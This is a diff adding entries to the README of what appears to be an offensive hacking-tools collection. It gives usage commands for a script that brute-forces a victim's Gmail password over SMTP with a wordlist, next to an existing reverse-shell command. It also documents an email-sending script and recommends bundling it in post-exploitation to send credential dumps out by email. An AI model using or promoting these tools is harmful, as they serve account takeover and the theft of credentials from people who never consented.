@@ -164,3 +164,25 @@ Usage example: \
 
 **Reverse Shell** \
 `python3 rev_shell.py -p 8080 -i 0.0.0.0`
+
+### GMail SMTP Brute
+
+*Bruteforce GMail accounts via SMTP*
+
+`python3 brute_gmail.py --email <victim@gmail.com> --wordlist <wordlist>`
+
+`python3 brute_gmail.py --e <victim@gmail.com> --w <wordlist>`
+
+In case of 2FA the password can be retrieved but you will still not be able to login without the 2FA app.
+
+## GMail Send SMTP Email
+
+*Send Email via Google SMTP*
+
+`python3 send_gmail.py --email <youremail@gmail.com> --password <yourpassword>`
+
+`python3 send_gmail.py --email <youremail@gmail.com> --pwd <yourpassword> --frm <fromemail@gmail.com> --body "Hello world"`
+
+`python3 send_gmail.py -e <youremail@gmail.com> -p <yourpassword> -f <fromemail@gmail.com> -b "test"`
+
+You can bundle up this script in post exploitation phases to send dumps, creds, etc to an email.
